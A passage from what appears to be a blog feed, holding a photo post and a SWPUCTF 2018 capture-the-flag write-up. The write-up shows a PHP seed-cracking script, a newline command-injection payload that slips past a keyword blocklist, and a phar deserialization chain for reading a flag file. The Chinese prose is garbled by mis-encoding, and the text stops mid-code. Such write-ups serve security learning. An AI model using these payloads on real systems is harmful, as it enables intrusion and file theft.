&lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=
      
    
    </summary>
    
    
      <category term="pwn" scheme="https://4f-kira.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>2018å¹´é£æœºä¸Šæ‹çš„ç…§ç‰‡</title>
    <link href="https://4f-kira.github.io/2018/12/31/2018-sola-photo/"/>
    <id>https://4f-kira.github.io/2018/12/31/2018-sola-photo/</id>
    <published>2018-12-31T14:12:26.000Z</published>
    <updated>2018-12-31T14:32:26.294Z</updated>
    
    <content type="html"><![CDATA[<p>ä»Šå¹´é£äº†å¥½å¤šæ¬¡ï¼Œè€Œä¸”æ°‘èˆªç»ˆäºå¯ä»¥ç©æ‰‹æœºäº†ï¼Œä½œä¸ºé£æœºçª—å£ä½çˆ±å¥½è€…ï¼Œæ‹äº†ä¸å°‘ç…§ç‰‡ï¼Œå‘åœ¨åšå®¢è®°å½•ä¸€ä¸‹ã€‚ä½œä¸ºä¸€ä¸ªå–œæ¬¢ä¹°ä¸­åˆæœºç¥¨çš„äººï¼Œä¸çŸ¥é“ä¸ºä½•è¿™ä¹ˆå¤šæ—¥è½ç…§ç‰‡[æ‚è„¸]</p><p><img src="http://ww1.sinaimg.cn/large/6701be31gy1fyq9vxiqtjj22o03k0npe.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/6701be31gy1fyq9vfg8q4j22o03k01ky.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/6701be31gy1fyq9vexecwj22o03k01ky.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/6701be31gy1fyq9x1daqoj22qj3nd1kz.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/6701be31gy1fyq9wk4qj7j22qj3ndnpe.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/6701be31gy1fyq9vhvxkjj22qj3nde82.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/6701be31gy1fyq9w00rx7j22qj3ndkjm.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/6701be31gy1fyq9vk2nm3j22qj3ndnpe.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/6701be31gy1fyq9w05920j22qj3ndkjm.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/6701be31gy1fyq9wrs0ihj22qj3ndnpe.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/6701be31gy1fyq9wg7csgj22qj3ndnpe.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/6701be31gy1fyq9wg56vkj22qj3ndx6q.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/6701be31gy1fyq9wo9vqzj22qj3ndnpe.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/6701be31gy1fyq9wh5ul9j22qj3ndnpe.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/6701be31gy1fyq9w4r5yjj22qj3ndb2a.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/6701be31gy1fyq9vy3nyej22qj3nde82.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/6701be31gy1fyq9wb2cufj23nd2qjhdu.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/6701be31gy1fyq9vric0ej22o03k0x6p.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/6701be31gy1fyq9vhd2pcj22o03k07wi.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/6701be31gy1fyq9x3l1tbj22o03k04qr.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/6701be31gy1fyq9vk5nrhj22o03k0e82.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/6701be31gy1fyq9x0ucukj22o03k0b2b.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/6701be31gy1fyqatpzdzmj22o03k0b2a.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/6701be31gy1fyqatqsdvgj22o03k04qq.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/6701be31gy1fyqau3xpy8j23k02o0e82.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;ä»Šå¹´é£äº†å¥½å¤šæ¬¡ï¼Œè€Œä¸”æ°‘èˆªç»ˆäºå¯ä»¥ç©æ‰‹æœºäº†ï¼Œä½œä¸ºé£æœºçª—å£ä½çˆ±å¥½è€…ï¼Œæ‹äº†ä¸å°‘ç…§ç‰‡ï¼Œå‘åœ¨åšå®¢è®°å½•ä¸€ä¸‹ã€‚ä½œä¸ºä¸€ä¸ªå–œæ¬¢ä¹°ä¸­åˆæœºç¥¨çš„äººï¼Œä¸çŸ¥é“ä¸ºä½•è¿™ä¹ˆå¤šæ—¥è½ç…§ç‰‡[æ‚è„¸]&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://ww1.sinaimg.cn/large/6701be31gy1fy
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>swpuctf2018</title>
    <link href="https://4f-kira.github.io/2018/12/20/swpuctf2018/"/>
    <id>https://4f-kira.github.io/2018/12/20/swpuctf2018/</id>
    <published>2018-12-20T03:11:03.000Z</published>
    <updated>2018-12-21T03:36:04.105Z</updated>
    
    <content type="html"><![CDATA[<h1 id="swpu2018"><a href="#swpu2018" class="headerlink" title="swpu2018"></a>swpu2018</h1><p>å¹´åº•å¿™æˆç‹—ï¼Œæ²¡ä»€ä¹ˆæ—¶é—´ï¼ŒèŠ±äº†ä¸¤ä¸ªæ™šä¸Šçš„æ—¶é—´ï¼Œåšäº†ä¸€ä¸‹ç®€å•çš„é¢˜ç›®ï¼Œè¿˜æœ‰äº›é¢˜ç›®åé¢ç»§ç»­è¡¥ã€‚</p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="ç”¨ä¼˜æƒ ç -ä¹°ä¸ª-X"><a href="#ç”¨ä¼˜æƒ ç -ä¹°ä¸ª-X" class="headerlink" title="ç”¨ä¼˜æƒ ç  ä¹°ä¸ª X ?"></a>ç”¨ä¼˜æƒ ç  ä¹°ä¸ª X ?</h3><p>æ³¨å†Œä¸€ä¸ªè´¦å·ï¼Œç„¶åç™»é™†ï¼Œä¼šå¼¹å‡ºä¸€ä¸ª15ä½ä¼˜æƒ ç ï¼Œåœ¨é¡µé¢è¾“å…¥æé†’ä¼˜æƒ ç ä¸º24ä½ï¼Œæ‰«æåå‘ç°æºç ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//ç”Ÿæˆä¼˜æƒ ç </span></span><br><span class="line">$_SESSION[<span class="string">'seed'</span>]=rand(<span class="number">0</span>,<span class="number">999999999</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">youhuima</span><span class="params">()</span></span>&#123;</span><br><span class="line">mt_srand($_SESSION[<span class="string">'seed'</span>]);</span><br><span class="line">    $str_rand = <span class="string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>;</span><br><span class="line">    $auth=<span class="string">''</span>;</span><br><span class="line">    $len=<span class="number">15</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $len; $i++ )&#123;</span><br><span class="line">        <span class="keyword">if</span>($i&lt;=($len/<span class="number">2</span>))</span><br><span class="line">              $auth.=substr($str_rand,mt_rand(<span class="number">0</span>, strlen($str_rand) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">              $auth.=substr($str_rand,(mt_rand(<span class="number">0</span>, strlen($str_rand) - <span class="number">1</span>))*<span class="number">-1</span>, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    setcookie(<span class="string">'Auth'</span>, $auth);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//support</span></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/^\d+\.\d+\.\d+\.\d+$/im"</span>,$ip))&#123;</span><br><span class="line">        <span class="keyword">if</span> (!preg_match(<span class="string">"/\?|flag|&#125;|cat|echo|\*/i"</span>,$ip))&#123;</span><br><span class="line">               <span class="comment">//æ‰§è¡Œå‘½ä»¤</span></span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">              <span class="comment">//flagå­—æ®µå’ŒæŸäº›å­—ç¬¦è¢«è¿‡æ»¤!</span></span><br><span class="line">        &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">             <span class="comment">// ä½ çš„è¾“å…¥ä¸æ­£ç¡®!</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ ¹æ®æºç æç¤ºï¼Œéœ€è¦çˆ†ç ´å¾—åˆ°éšæœºç§å­ï¼Œç„¶åç”Ÿæˆ24ä½ä¼˜æƒ ç ï¼Œçˆ†ç ´è„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span>($x=<span class="number">0</span>;$x&lt;<span class="number">999999999</span>;$x++)&#123;</span><br><span class="line">    mt_srand($x);</span><br><span class="line">    $str_rand = <span class="string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>;</span><br><span class="line">    $auth=<span class="string">''</span>;</span><br><span class="line">    $len=<span class="number">15</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $len; $i++ )&#123;</span><br><span class="line">        <span class="keyword">if</span>($i&lt;=($len/<span class="number">2</span>))</span><br><span class="line">              $auth.=substr($str_rand,mt_rand(<span class="number">0</span>, strlen($str_rand) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">              $auth.=substr($str_rand,(mt_rand(<span class="number">0</span>, strlen($str_rand) - <span class="number">1</span>))*<span class="number">-1</span>, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>($auth == <span class="string">'4d1Sb0qX2fy1FBV'</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $x . <span class="string">"\n"</span>;        </span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ•ˆç‡å¤ªä½ï¼Œå¯ä»¥ç”¨<code>php_mt_seed</code>ï¼Œé¦–å…ˆå°†å­—ç¬¦ä¸²è¿˜åŸä¸ºæ•°å­—</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">str_rand = <span class="string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>;</span><br><span class="line">s = <span class="string">'Lnnon15igXPrvif'</span></span><br><span class="line">num = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">15</span>):</span><br><span class="line"><span class="keyword">if</span> (i&lt;=(<span class="number">15</span>/<span class="number">2</span>)):</span><br><span class="line">num.append(str_rand.index(s[i]))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">num.append(str_rand[::<span class="number">-1</span>].index(s[i])+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">'./php_mt_seed '</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> num[:]:</span><br><span class="line">cmd += <span class="string">'&#123;&#125; &#123;&#125; 0 61 '</span>.format(i,i)</span><br><span class="line"><span class="keyword">print</span> cmd</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># kira @ k1r4 in ~/pwn/swpu/php_mt_seed-4.0 [10:10:38] C:130</span></span><br><span class="line">$ ./php_mt_seed 47 47 0 61 13 13 0 61 13 13 0 61 14 14 0 61 13 13 0 61 27 27 0 61 31 31 0 61</span><br><span class="line">Pattern: EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62</span><br><span class="line">Version: 3.0.7 to 5.2.0</span><br><span class="line">Found 0, trying 0xfc000000 - 0xffffffff, speed 511.8 Mseeds/s</span><br><span class="line">Version: 5.2.1+</span><br><span class="line">Found 0, trying 0x12000000 - 0x13ffffff, speed 40.4 Mseeds/s</span><br><span class="line">seed = 0x13af8864 = 330270820 (PHP 7.1.0+)</span><br><span class="line">Found 1, trying 0xfe000000 - 0xffffffff, speed 40.3 Mseeds/s</span><br><span class="line">Found 1</span><br></pre></td></tr></table></figure><p>ç„¶åæ ¹æ®éšæœºæ•°ç”Ÿæˆ24ä½çš„éªŒè¯ç ï¼Œå³å¯åˆ°è¾¾å‘½ä»¤æ‰§è¡Œçš„åœ°æ–¹ï¼Œè™½ç„¶è¿‡æ»¤äº†ä¸å°‘å­—ç¬¦ï¼Œä¸è¿‡å¾ˆå®¹æ˜“ç»•è¿‡</p><p>æœ€åpayload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip=0.0.0.0%0aca\t /fl\ag</span><br></pre></td></tr></table></figure><h3 id="SimplePHP"><a href="#SimplePHP" class="headerlink" title="SimplePHP"></a>SimplePHP</h3><p><code>file.php</code>å¯ä»¥çœ‹æŸ¥çœ‹æ–‡ä»¶ï¼Œå¾—åˆ°phpæ–‡ä»¶çš„æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">header(<span class="string">"content-type:text/html;charset=utf-8"</span>);  </span><br><span class="line"><span class="keyword">include</span> <span class="string">'function.php'</span>; </span><br><span class="line"><span class="keyword">include</span> <span class="string">'class.php'</span>; </span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>,<span class="string">'/var/www/html/'</span>); </span><br><span class="line">$file = $_GET[<span class="string">"file"</span>] ? $_GET[<span class="string">'file'</span>] : <span class="string">""</span>; </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($file)) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;There is no file to show!&lt;h2/&gt;"</span>; </span><br><span class="line">&#125; </span><br><span class="line">$show = <span class="keyword">new</span> Show(); </span><br><span class="line"><span class="keyword">if</span>(file_exists($file)) &#123; </span><br><span class="line">    $show-&gt;source = $file; </span><br><span class="line">    $show-&gt;_show(); </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="keyword">empty</span>($file))&#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'file doesn\'t exists.'</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>function.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">//show_source(__FILE__); </span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"base.php"</span>; </span><br><span class="line">header(<span class="string">"Content-type: text/html;charset=utf-8"</span>); </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file_do</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> $_FILES; </span><br><span class="line">    $filename = md5($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>].$_SERVER[<span class="string">"REMOTE_ADDR"</span>]).<span class="string">".jpg"</span>; </span><br><span class="line">    <span class="comment">//mkdir("upload",0777); </span></span><br><span class="line">    <span class="keyword">if</span>(file_exists(<span class="string">"upload/"</span> . $filename)) &#123; </span><br><span class="line">        unlink($filename); </span><br><span class="line">    &#125; </span><br><span class="line">    move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>],<span class="string">"upload/"</span> . $filename); </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;script type="text/javascript"&gt;alert("ä¸Šä¼ æˆåŠŸ!");&lt;/script&gt;'</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> $_FILES; </span><br><span class="line">    <span class="keyword">if</span>(upload_file_check()) &#123; </span><br><span class="line">        upload_file_do(); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file_check</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> $_FILES; </span><br><span class="line">    $allowed_types = <span class="keyword">array</span>(<span class="string">"gif"</span>,<span class="string">"jpeg"</span>,<span class="string">"jpg"</span>,<span class="string">"png"</span>); </span><br><span class="line">    $temp = explode(<span class="string">"."</span>,$_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]); </span><br><span class="line">    $extension = end($temp); </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>($extension)) &#123; </span><br><span class="line">        <span class="comment">//echo "&lt;h4&gt;è¯·é€‰æ‹©ä¸Šä¼ çš„æ–‡ä»¶:" . "&lt;h4/&gt;"; </span></span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="keyword">if</span>(in_array($extension,$allowed_types)) &#123; </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;script type="text/javascript"&gt;alert("Invalid file!");&lt;/script&gt;'</span>; </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>class.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $test;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str = $name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test = <span class="keyword">$this</span>-&gt;str;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $content = <span class="keyword">$this</span>-&gt;str[<span class="string">'str'</span>]-&gt;source;</span><br><span class="line">        <span class="keyword">return</span> $content;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span><span class="params">($key,$value)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;$key = $value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/http|https|file:|gopher|dict|\.\.|f1ag/i'</span>,<span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker!'</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            highlight_file(<span class="keyword">$this</span>-&gt;source);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/http|https|file:|gopher|dict|\.\./i"</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"hacker~"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">"index.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $params;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;params = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get($key);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($key)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;params[$key])) &#123;</span><br><span class="line">            $value = <span class="keyword">$this</span>-&gt;params[$key];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $value = <span class="string">"index.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;file_get($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $text = base64_encode(file_get_contents($value));</span><br><span class="line">        <span class="keyword">return</span> $text;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åˆ©ç”¨<code>phar</code>è§¦å‘ååºåˆ—åŒ–ï¼Œè§¦å‘è¿‡ç¨‹å¦‚ä¸‹ï¼š</p><ol><li><code>file_exists($file)</code>è§¦å‘pharååºåˆ—åŒ–</li><li>è§¦å‘<code>class C1e4r</code>çš„<code>__destruct()</code>ï¼Œè€Œå‡½æ•°ä¸­çš„<code>echo $this-&gt;test;</code>è§¦å‘<code>class Show</code>ä¸­çš„<code>__toString()</code></li><li><code>$content = $this-&gt;str[&#39;str&#39;]-&gt;source;</code>ç”±äºè¯»å–ä¸å¯è®¿é—®å±æ€§çš„å€¼æ—¶ï¼Œ<code>class Test</code>ä¸­ <code>__get()</code> ä¼šè¢«è°ƒç”¨ã€‚</li><li>æœ€ç»ˆè°ƒç”¨<code>$this-&gt;get($key)</code>è·å–<code>$this-&gt;params[&#39;source&#39;]</code>çš„æºç </li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$a = <span class="keyword">new</span> Test();</span><br><span class="line">$a-&gt;params[<span class="string">'source'</span>]= <span class="string">'/var/www/html/f1ag.php'</span>;</span><br><span class="line">$b = <span class="keyword">new</span> Show();</span><br><span class="line">$b-&gt;str[<span class="string">'str'</span>] = $a;</span><br><span class="line">$f = <span class="keyword">new</span> C1e4r($b);</span><br><span class="line">$phar = <span 